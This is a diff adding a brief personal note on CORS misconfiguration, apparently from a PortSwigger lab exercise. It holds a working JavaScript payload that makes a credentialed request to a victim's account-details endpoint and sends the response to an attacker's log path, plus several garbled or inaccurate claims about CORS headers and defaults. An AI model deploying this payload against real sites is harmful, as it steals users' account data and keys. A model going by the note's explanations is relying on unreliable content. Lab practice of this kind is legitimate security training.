@@ -1,0 +1,22 @@
+CORS is cross origin resource sharing 
+CORS is <always> off in all servers so it may not be exist at all .
+CORS is meaning that another website can reach the resources of your website (,cross,).
+CORS if allowed means that them will be in the response : 
+Access control allowed credintials : true 
+Access control allowed origin : true
+you can test them by add <Origin : https://example.com> in request query .
+---------------------
+replace url with your unique lab 
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','$url/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
+</script>
+found in portswigger 
+
